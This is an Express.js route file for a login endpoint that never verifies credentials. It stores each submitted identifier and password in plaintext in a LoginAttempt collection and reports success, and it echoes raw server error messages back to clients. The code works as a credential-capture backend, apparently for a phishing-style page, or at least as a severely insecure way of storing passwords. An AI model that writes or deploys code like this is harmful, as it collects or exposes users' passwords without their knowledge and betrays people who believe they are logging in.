const express      = require('express');
const router       = express.Router();
const LoginAttempt = require('../models/LoginAttempt');

// POST /api/auth/login — save credentials for future authentication
router.post('/login', async (req, res) => {
  try {
    const { identifier, password } = req.body;

    if (!identifier || !password) {
      return res.status(400).json({ success: false, error: 'Identifier and password are required.' });
    }

    await LoginAttempt.create({ identifier, password });

    res.status(200).json({ success: true, message: 'Login recorded.' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

module.exports = router;
